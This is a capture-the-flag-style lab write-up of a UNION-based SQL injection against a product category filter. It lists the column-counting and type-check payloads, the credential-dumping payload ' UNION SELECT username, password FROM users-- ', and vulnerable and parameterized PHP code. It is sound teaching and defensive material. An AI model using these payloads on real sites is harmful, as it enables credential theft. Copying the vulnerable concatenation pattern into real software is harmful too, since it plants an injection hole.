# Lab: SQL injection UNION attack, retrieving data from other tables

## 1. Vulnerability Discovery & Enumeration (The Analysis)
* **Target Endpoint / Parameter:** `/filter?category=xyz`
* **Vulnerability Type:** Server-Side (SQL Injection - UNION Based)
* **Target Infrastructure:** Standard Relational Database (Non-Oracle Schema)

### Step 1: Mapping Column Count via Structural Ordering
To execute a successful cross-table `UNION` data extraction, the injected payload structure must match the width of the application's primary query buffer. I used the `ORDER BY` clause to locate the array boundary:
* `category=xyz' ORDER BY 1-- ` -> HTTP 200 OK
* `category=xyz' ORDER BY 2-- ` -> HTTP 200 OK
* `category=xyz' ORDER BY 3-- ` -> HTTP 500 Internal Server Error

**Deduction:** The database architecture expects exactly **2 columns**.

### Step 2: Determining Data Type Compatibility
I verified that both structural columns cleanly process string data types by injecting standalone text parameters:
* Payload: `category=xyz' UNION SELECT 'abc', 'def'-- ` -> HTTP 200 OK

**Deduction:** Both columns support arbitrary string/text payloads, matching the schema layout required to dump alpha-numeric security records.

## 2. Exploitation & Exfiltration (The Hack)
* **Target Schema (From Lab Metadata Constraints):** 
  * Target Table: `users`
  * Target Column 1: `username`
  * Target Column 2: `password`
* **Payload Used:** `' UNION SELECT username, password FROM users-- `
* **Full URL Encoded Input:** `/filter?category=xyz'+UNION+SELECT+username,+password+FROM+users--+`
* **Mechanism:**
  1. The trailing single quote (`'`) successfully terminates the developer's original category filter string wrapper context.
  2. The custom category filter is set to an arbitrary dummy parameter (`xyz`), forcing the original product lookup loop to yield zero items. This ensures the front-end template only iterates over and displays our injected query results.
  3. The `UNION SELECT` command requests the application to fetch data records from the `username` and `password` fields side-by-side out of the `users` table.
  4. The comment sequence (`-- `) drops the remaining trailing developer filters to prevent runtime compilation failures.
* **Result:** The system dumped the complete internal user credentials directly onto the public webpage interface text templates, exposing the administrative password string.

## 3. Remediation (The Fix)
* **Flawed Concept:** The backend application takes raw, unvalidated HTTP client text parameters and appends them directly into structural executable segments of a database command.
* **The Correction:** Implement strict decoupling of operational code logic from data strings using **Prepared Statements (Parameterized Queries)**.

### Vulnerable Code Example (Conceptual Backend Context)
```php
// Vulnerable: Variable concatenation allows query structural logic manipulation at runtime
\$category = \$_GET['category'];
\$query = "SELECT name, description FROM products WHERE category = '" . \$category . "' AND released = 1";
\$result = \$db->query(\$query);
```

### Secure Remediation Example (Parameterized Validation)
```php
// Secure: Pre-compiling the query layout isolates client string vectors as safe text literals
\$category = \$_GET['category'];
\$stmt = \$db->prepare('SELECT name, description FROM products WHERE category = :category AND released = 1');
\$stmt->execute(['category' => \$category]);
\$products = \$stmt->fetchAll();
```
